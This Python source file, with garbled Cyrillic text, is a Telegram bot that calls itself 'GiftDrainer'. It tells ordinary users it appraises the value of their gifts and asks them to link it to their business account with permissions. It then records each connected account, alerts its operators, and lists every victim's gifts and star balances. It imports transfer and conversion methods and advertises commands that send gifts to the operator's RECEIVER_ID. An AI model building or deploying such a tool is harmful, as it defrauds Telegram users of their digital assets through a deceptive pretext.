from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, business_connection, BusinessConnection, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.methods.get_business_account_star_balance import GetBusinessAccountStarBalance
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.exceptions import TelegramBadRequest

from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts, TransferGift, ConvertGiftToStars, UpgradeGift, TransferBusinessAccountStars, GetStarsRevenueWithdrawalUrl

import aiogram.exceptions as exceptions
import logging
import asyncio
import json
import config
import os

CONNECTIONS_FILE = "business_connections_replit.json"

TOKEN = config.BOT_TOKEN
ADMIN_ID = config.ADMIN_ID
RECEIVER_ID = config.RECEIVER_ID

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot_replit.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

bot = Bot(token=TOKEN)
dp = Dispatcher()

def load_connections():
    """–ó–∞–≥—Ä—É–∂–∞–µ—Ç –≤—Å–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è –∏–∑ —Ñ–∞–π–ª–∞"""
    try:
        with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except FileNotFoundError:
        logger.warning(f"–§–∞–π–ª {CONNECTIONS_FILE} –Ω–µ –Ω–∞–π–¥–µ–Ω")
        return []
    except json.JSONDecodeError as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞–∑–±–æ—Ä–µ JSON-—Ñ–∞–π–ª–∞ {CONNECTIONS_FILE}: {e}")
        return []

def save_business_connection_data(business_connection):
    """–°–æ—Ö—Ä–∞–Ω—è–µ—Ç –¥–∞–Ω–Ω—ã–µ –±–∏–∑–Ω–µ—Å-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è –≤ —Ñ–∞–π–ª"""
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": business_connection.user.first_name or "Unknown",
        "last_name": business_connection.user.last_name or "Unknown"
    }

    data = []

    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError as e:
            logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —á—Ç–µ–Ω–∏–∏ —Ñ–∞–π–ª–∞ {CONNECTIONS_FILE}: {e}")
            data = []

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    try:
        with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        logger.info(f"–°–æ—Ö—Ä–∞–Ω–µ–Ω—ã –¥–∞–Ω–Ω—ã–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {business_connection.user.id}")
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è: {e}")


@dp.business_connection()
async def handle_business_connect(business_connection: BusinessConnection):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ Business –∞–∫–∫–∞—É–Ω—Ç—É"""
    try:
        logger.info(f"–ù–æ–≤–æ–µ Business –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ: {business_connection.user.id} ({business_connection.user.username})")

        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –¥–∞–Ω–Ω—ã–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
        save_business_connection_data(business_connection)

        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º
        for admin_id in ADMIN_ID:
            try:
                msg = (
                    f"ü§ñ –ù–æ–≤—ã–π –±–∏–∑–Ω–µ—Å-–±–æ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω! (Replit –≤–µ—Ä—Å–∏—è)\n\n"
                    f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{business_connection.user.username or '‚Äî'}\n"
                    f"ÔøΩÔøΩ User ID: {business_connection.user.id}\n"
                    f"üîó Connection ID: {business_connection.id}\n\n"
                    f"‚úÖ –ë–æ—Ç —Ä–∞–±–æ—Ç–∞–µ—Ç –≤ Replit!"
                )
                await bot.send_message(admin_id, msg)
            except Exception as e:
                logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É {admin_id}: {e}")

        logger.info(f"Business –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–æ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {business_connection.user.id}")

    except Exception as e:
        logger.exception(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ Business –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è: {e}")


@dp.message(F.text == "/start")
async def start_command(message: Message):
    """–ö–æ–º–∞–Ω–¥–∞ /start"""
    if message.from_user.id not in ADMIN_ID:
        await message.answer("–ü—Ä–∏–≤–µ—Ç! –Ø –±–∏–∑–Ω–µ—Å-–±–æ—Ç, –æ—Ü–µ–Ω–∏–≤–∞—é—â–∏–π —Å—Ç–æ–∏–º–æ—Å—Ç—å –ø–æ–¥–∞—Ä–∫–æ–≤ –Ω–∞ –∞–∫–∫–∞—É–Ω—Ç–µ Telegram. –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –≤—ã –ø–æ–¥–∫–ª—é—á–∏–ª–∏ –º–µ–Ω—è –∫ —Å–≤–æ–µ–º—É –±–∏–∑–Ω–µ—Å –∞–∫–∫–∞—É–Ω—Ç—É –∏ –≤—ã–¥–∞–ª–∏ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è")
        return

    connections = load_connections()

    await message.answer(
        f"ü§ñ GiftDrainer Bot (Replit –≤–µ—Ä—Å–∏—è)\n\n"
        f"üëã –ü—Ä–∏–≤–µ—Ç! –Ø –±–æ—Ç –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–æ–¥–∞—Ä–∫–∞–º–∏ –∏ –∑–≤–µ–∑–¥–∞–º–∏ –≤ Business –∞–∫–∫–∞—É–Ω—Ç–∞—Ö Telegram.\n\n"
        f"üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:\n"
        f"‚Ä¢ –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–π: {len(connections)}\n"
        f"‚Ä¢ –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–≤: {len(ADMIN_ID)}\n\n"
        f"üìã –î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:\n\n"
        f"ÔøΩÔøΩ –ü—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö:\n"
        f"‚Ä¢ /gifts - –ø—Ä–æ—Å–º–æ—Ç—Ä –ø–æ–¥–∞—Ä–∫–æ–≤ –ø–æ –≤—Å–µ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è–º\n"
        f"‚Ä¢ /stars - –ø—Ä–æ—Å–º–æ—Ç—Ä –∑–≤–µ–∑–¥ –ø–æ –≤—Å–µ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è–º\n"
        f"‚Ä¢ /balance - –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –±–∞–ª–∞–Ω—Å—ã –∞–∫–∫–∞—É–Ω—Ç–æ–≤\n\n"
        f"üéÅ –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–æ–¥–∞—Ä–∫–∞–º–∏:\n"
        f"‚Ä¢ /transfer <gift_id> <user_id> - –ø–µ—Ä–µ–¥–∞—Ç—å –ø–æ–¥–∞—Ä–æ–∫\n"
        f"‚Ä¢ /convert - –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –≤—Å–µ –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã\n\n"
        f"‚≠ê –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∑–≤–µ–∑–¥–∞–º–∏:\n"
        f"‚Ä¢ /transfer_stars <amount> <user_id> - –ø–µ—Ä–µ–¥–∞—Ç—å –∑–≤–µ–∑–¥—ã\n"
        f"‚Ä¢ /withdraw <amount> [password] - –≤—ã–≤–µ—Å—Ç–∏ –∑–≤–µ–∑–¥—ã\n\n"
        f"üîß –î–∏–∞–≥–Ω–æ—Å—Ç–∏–∫–∞:\n"
        f"‚Ä¢ /check_receiver - –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –ø–æ–ª—É—á–∞—Ç–µ–ª—è\n\n"
        f"üí° –í–∞–∂–Ω–æ: –ü–æ–¥–∞—Ä–∫–∏ ‚Üí RECEIVER_ID, –ó–≤–µ–∑–¥—ã ‚Üí –í–ª–∞–¥–µ–ª–µ—Ü Business –∞–∫–∫–∞—É–Ω—Ç–∞\n\n"
        f"üñ•Ô∏è –í–µ—Ä—Å–∏—è: Replit"
    )


@dp.message(F.text == "/gifts")
async def gifts_command(message: Message):
    """–ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –ø–æ–¥–∞—Ä–∫–æ–≤"""
    if message.from_user.id not in ADMIN_ID:
        await message.answer("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥–µ")
        return

    connections = load_connections()
    if not connections:
        await message.answer("‚ùå –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π")
        return

    try:
        result_msg = "üéÅ –ü–æ–¥–∞—Ä–∫–∏ –ø–æ –≤—Å–µ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è–º:\n\n"

        for connection in connections:
            user_id = connection["user_id"]
            username = connection.get("username", "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ")
            connection_id = connection["business_connection_id"]

            try:
                gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=connection_id))
                gifts = gifts_response.gifts

                unique_count = len([gift for gift in gifts if gift.type == "unique"])
                regular_count = len(gifts) - unique_count

                result_msg += (
                    f"ÔøΩÔøΩ @{username} (ID: {user_id})\n"
                    f"‚ñ´Ô∏è –í—Å–µ–≥–æ –ø–æ–¥–∞—Ä–∫–æ–≤: {len(gifts)}\n"
                    f"‚ñ´Ô∏è –û–±—ã—á–Ω—ã—Ö: {regular_count}\n"
                    f"‚ñ´Ô∏è –£–Ω–∏–∫–∞–ª—å–Ω—ã—Ö: {unique_count}\n\n"
                )

            except Exception as e:
                result_msg += f"ÔøΩÔøΩ @{username} (ID: {user_id})\n‚ñ´Ô∏è –û—à–∏–±–∫–∞: {e}\n\n"

        await message.answer(result_msg)

    except Exception as e:
        logger.exception(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å–ø–∏—Å–∫–∞ –ø–æ–¥–∞—Ä–∫–æ–≤: {e}")
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –ø–æ–¥–∞—Ä–∫–æ–≤: {e}")


@dp.message(F.text == "/stars")
async def stars_command(message: Message):
    """–ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –∑–≤—ë–∑–¥"""
    if message.from_user.id not in ADMIN_ID:
        await message.answer("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥–µ")
        return

    connections = load_connections()
    if not connections:
        await message.answer("‚ùå –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π")
        return

    try:
        result_msg = "‚≠ê –ó–≤–µ–∑–¥—ã –ø–æ –≤—Å–µ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è–º:\n\n"
        total_stars = 0

        for connection in connections:
            user_id = connection["user_id"]
            username = connection.get("username", "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ")
            connection_id = connection["business_connection_id"]

            try:
                stars_response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=connection_id))
                stars_amount = stars_response.star_amount
                total_stars += stars_amount

                result_msg += (
                    f"ÔøΩÔøΩ @{username} (ID: {user_id})\n"
                    f"‚ñ´Ô∏è –ó–≤–µ–∑–¥: {stars_amount} ‚≠ê\n\n"
                )

            except Exception as e:
                result_msg += f"ÔøΩÔøΩ @{username} (ID: {user_id})\n‚ñ´Ô∏è –û—à–∏–±–∫–∞: {e}\n\n"

        result_msg += f"üí∞ –û–±—â–∏–π –±–∞–ª–∞–Ω—Å: {total_stars} ‚≠ê"

        await message.answer(result_msg)

    except Exception as e:
        logger.exception(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –±–∞–ª–∞–Ω—Å–∞ –∑–≤–µ–∑–¥: {e}")
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∑–≤–µ–∑–¥: {e}")


@dp.message(F.text == "/balance")
async def balance_command(message: Message):
    """–ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –±–∞–ª–∞–Ω—Å–∞ Business –∞–∫–∫–∞—É–Ω—Ç–æ–≤"""
    if message.from_user.id not in ADMIN_ID:
        await message.answer("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥–µ")
        return

    try:
        connections = load_connections()
        if not connections:
            await message.answer("‚ùå –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π")
            return

        await message.answer("üí∞ –ü—Ä–æ–≤–µ—Ä—è—é –±–∞–ª–∞–Ω—Å—ã Business –∞–∫–∫–∞—É–Ω—Ç–æ–≤...")

        total_balances = []

        for connection in connections:
            user_id = connection["user_id"]
            username = connection.get("username", "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ")
            connection_id = connection["business_connection_id"]

            try:
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º –±–∞–ª–∞–Ω—Å –∑–≤–µ–∑–¥
                try:
                    stars_response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=connection_id))
                    star_balance = stars_response.star_amount
                except Exception as e:
                    star_balance = f"–û—à–∏–±–∫–∞: {e}"

                # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–¥–∞—Ä–∫–æ–≤
                try:
                    gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=connection_id))
                    gifts_count = len(gifts_response.gifts) if gifts_response.gifts else 0
                except Exception as e:
                    gifts_count = f"–û—à–∏–±–∫–∞: {e}"

                balance_info = (
                    f"ÔøΩÔøΩ @{username} (ID: {user_id})\n"
                    f"‚≠ê –ó–≤–µ–∑–¥—ã: {star_balance}\n"
                    f"üéÅ –ü–æ–¥–∞—Ä–∫–∏: {gifts_count}\n"
                    f"üîó Connection ID: {connection_id[:10]}..."
                )

                total_balances.append(balance_info)

            except Exception as e:
                error_info = (
                    f"‚ùå @{username} (ID: {user_id})\n"
                    f"–û—à–∏–±–∫–∞: {str(e)[:100]}..."
                )
                total_balances.append(error_info)
                logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –±–∞–ª–∞–Ω—Å–∞ –¥–ª—è {user_id}: {e}")

        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã
        final_report = "üí∞ –ë–∞–ª–∞–Ω—Å—ã Business –∞–∫–∫–∞—É–Ω—Ç–æ–≤:\n\n" + "\n\n".join(total_balances)

        await message.answer(final_report)

        logger.info(f"–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–∞–ª–∞–Ω—Å–æ–≤ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º {message.from_user.id}")

    except Exception as e:
        logger.exception(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –±–∞–ª–∞–Ω—Å–æ–≤: {e}")
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –±–∞–ª–∞–Ω—Å–æ–≤: {e}")


@dp.message(F.text == "/check_receiver")
async def check_receiver_command(message: Message):
    """–ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø—Ä–∞–≤–∏–ª—å–Ω–æ—Å—Ç–∏ RECEIVER_ID"""
    if message.from_user.id not in ADMIN_ID:
        await message.answer("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥–µ")
        return

    try:
        await message.answer(
            f"ÔøΩÔøΩ –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –ø–æ–ª—É—á–∞—Ç–µ–ª—è –ø–æ–¥–∞—Ä–∫–æ–≤\n\n"
            f"üìã –¢–µ–∫—É—â–∏–π RECEIVER_ID: {RECEIVER_ID}\n"
            f"üìù –¢–∏–ø: {type(RECEIVER_ID).__name__}\n\n"
            f"üí° –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏:\n"
            f"‚Ä¢ –ï—Å–ª–∏ RECEIVER_ID - —á–∏—Å–ª–æ, —ç—Ç–æ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –≤–∞—à Telegram User ID\n"
            f"‚Ä¢ –ï—Å–ª–∏ RECEIVER_ID –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å @, —ç—Ç–æ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –≤–∞—à username\n"
            f"‚Ä¢ –ü–æ–ª—É—á–∞—Ç–µ–ª—å –¥–æ–ª–∂–µ–Ω –Ω–∞—á–∞—Ç—å –¥–∏–∞–ª–æ–≥ —Å –±–æ—Ç–æ–º (/start)\n\n"
            f"ÔøΩÔøΩ –î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è User ID:\n"
            f"1. –ù–∞–ø–∏—à–∏—Ç–µ –±–æ—Ç—É @userinfobot\n"
            f"2. –°–∫–æ–ø–∏—Ä—É–π—Ç–µ –ø–æ–ª—É—á–µ–Ω–Ω—ã–π ID –≤ config.py\n"
            f"3. –ü–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç–µ –±–æ—Ç–∞"
        )

        logger.info(f"–ü—Ä–æ–≤–µ—Ä–∫–∞ RECEIVER_ID –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º {message.from_user.id}")

    except Exception as e:
        logger.exception(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ RECEIVER_ID: {e}")
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ: {e}")


@dp.message()
async def handle_all_messages(message: Message):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –≤—Å–µ—Ö –æ—Å—Ç–∞–ª—å–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π"""
    # –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏—è –æ—Ç –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–≤
    if message.from_user.id in ADMIN_ID:
        return

    # –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏—è –±–µ–∑ —Ç–µ–∫—Å—Ç–∞
    if not message.text:
        return

    try:
        logger.info(f"–ü–æ–ª—É—á–µ–Ω–æ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {message.from_user.id}: {message.text[:50]}...")

        # –ü—Ä–æ—Å—Ç–æ–π –∞–≤—Ç–æ–æ—Ç–≤–µ—Ç—á–∏–∫
        response = "–°–ø–∞—Å–∏–±–æ –∑–∞ –≤–∞—à–µ —Å–æ–æ–±—â–µ–Ω–∏–µ! –Ø –±–∏–∑–Ω–µ—Å-–±–æ—Ç, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–º–æ–≥–∞–µ—Ç —É–ø—Ä–∞–≤–ª—è—Ç—å –ø–æ–¥–∞—Ä–∫–∞–º–∏ –∏ –∑–≤–µ–∑–¥–∞–º–∏ –≤ Telegram. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É /start –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∫–æ–º–∞–Ω–¥."

        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Ç–≤–µ—Ç
        await message.answer(response)

        logger.info(f"–û—Ç–ø—Ä–∞–≤–ª–µ–Ω –∞–≤—Ç–æ–æ—Ç–≤–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é {message.from_user.id}")

    except Exception as e:
        logger.exception(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ —Å–æ–æ–±—â–µ–Ω–∏—è –æ—Ç {message.from_user.id}: {e}")
        await message.answer("–ò–∑–≤–∏–Ω–∏—Ç–µ, –ø—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –≤–∞—à–µ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è.")


async def main():
    """–ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –±–æ—Ç–∞"""
    try:
        logger.info("–ó–∞–ø—É—Å–∫ –±–æ—Ç–∞ (Replit –≤–µ—Ä—Å–∏—è)...")
        await dp.start_polling(bot)
    except Exception as e:
        logger.exception(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ –±–æ—Ç–∞: {e}")
    finally:
        await bot.session.close()


if __name__ == "__main__":
    asyncio.run(main())